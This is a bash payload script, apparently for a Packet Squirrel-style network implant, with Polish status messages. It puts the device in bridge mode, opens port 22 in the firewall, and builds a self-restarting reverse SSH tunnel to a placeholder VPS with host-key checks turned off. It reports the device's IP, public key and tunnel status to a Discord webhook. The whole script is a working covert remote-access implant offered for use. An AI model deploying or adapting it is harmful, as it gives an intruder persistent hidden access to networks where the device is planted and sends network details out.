#!/bin/bash
# Reverse SSH Tunnel – switch=3, NETMODE BRIDGE

DISCORD_WEBHOOK_URL="https://discord.com/api/webhooks/TWOJ_WEBHOOK_URL"
VPS_IP="twoj.vps.ip"
SSH_PORT=2222
VPS_USER="root"
REMOTE_PORT=19999
SSH_KEY="/root/.ssh/autossh_key"

LOG_DIR="/root/payloads/switch3"
mkdir -p "$LOG_DIR"
LOG_FILE="$LOG_DIR/payload.log"

log() { echo "[$(date +%H:%M:%S)] $*" >> "$LOG_FILE"; }

dsend() {
    log "DC: $*"
    wget -q --timeout=10 --no-check-certificate \
         --header='Content-Type: application/json' \
         --post-data="$(printf '{"content": "%s"}' "$*")" \
         "$DISCORD_WEBHOOK_URL" -O /dev/null
}

log "=== start ==="
LED SETUP
NETMODE BRIDGE
sleep 5
iptables -I INPUT -p tcp --dport 22 -j ACCEPT

dsend ":tools: PS bootuje..."

for i in $(seq 1 25); do
    WAN_IP=$(ip addr show br-lan 2>/dev/null | grep "inet " | awk '{print $2}')
    [ -z "$WAN_IP" ] && WAN_IP=$(ip addr show eth1 2>/dev/null | grep "inet " | awk '{print $2}')
    [ -n "$WAN_IP" ] && break
    sleep 1
done
MY_IP=$(echo "$WAN_IP" | cut -d/ -f1)
log "IP: ${MY_IP:-BRAK}"

if [ -z "$MY_IP" ]; then
    dsend ":red_circle: PS NIE DOSTAL IP!"
    LED FAIL
    exit 1
fi

if [ ! -f "$SSH_KEY" ]; then
    ssh-keygen -t ed25519 -f "$SSH_KEY" -N "" -q
    dsend ":key: Nowy klucz:\\n\`\`\`$(cat ${SSH_KEY}.pub)\`\`\`"
    LED FAIL
    exit 1
fi

pkill -f "ssh.*-R.*${REMOTE_PORT}" 2>/dev/null
sleep 1

dsend ":green_circle: PS Online\\nIP: ${MY_IP}\\nLacze z VPS..."
LED ATTACK

(
    trap '' HUP
    while true; do
        ERR_LOG=$(mktemp)
        if ssh -o "ServerAliveInterval=30" \
               -o "ServerAliveCountMax=3" \
               -o "StrictHostKeyChecking=no" \
               -o "UserKnownHostsFile=/dev/null" \
               -o "ExitOnForwardFailure=yes" \
               -o "ConnectTimeout=15" \
               -p "${SSH_PORT}" \
               -N \
               -R "${REMOTE_PORT}:127.0.0.1:22" \
               -i "$SSH_KEY" \
               "${VPS_USER}@${VPS_IP}" 2>"$ERR_LOG"
        then
            log "tunnel_exit: clean"
        else
            log "tunnel_exit: rc=$? err=$(tr '\n' ' ' < "$ERR_LOG")"
        fi
        rm -f "$ERR_LOG"
        sleep 5
    done
) &
TUNNEL_PID=$!

sleep 5
TUNNEL_OK=0
for i in $(seq 1 8); do
    if ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 \
           -p "${SSH_PORT}" -i "$SSH_KEY" "${VPS_USER}@${VPS_IP}" \
           "ss -tln 2>/dev/null | grep -q '127.0.0.1:${REMOTE_PORT}'" 2>/dev/null; then
        TUNNEL_OK=1
        break
    fi
    sleep 2
done

if [ "$TUNNEL_OK" = "1" ]; then
    log "weryfikacja OK"
    dsend ":white_check_mark: **Tunel aktywny!**\\nZ VPS: \`ssh root@127.0.0.1 -p ${REMOTE_PORT}\`"
else
    if kill -0 $TUNNEL_PID 2>/dev/null; then
        ERRS=$(grep "Error\|error\|failed\|FAIL" "$LOG_FILE" | tail -3 | tr '\n' ' ')
        dsend ":warning: **Tunel NIE zweryfikowany!**\\nPID zyje, forwarding NIE dziala.\\nBledy: ${ERRS}"
    else
        ERRS=$(grep "Error\|error\|failed\|FAIL" "$LOG_FILE" | tail -3 | tr '\n' ' ')
        dsend ":red_circle: **Tunel padl!**\\nBledy: ${ERRS}"
        LED FAIL
        exit 1
    fi
fi

NO_LED=true BUTTON

dsend ":stop_sign: Koncze..."
kill $TUNNEL_PID 2>/dev/null
kill $(jobs -p) 2>/dev/null
sync
LED R SUCCESS
sleep 1
LED OFF
halt
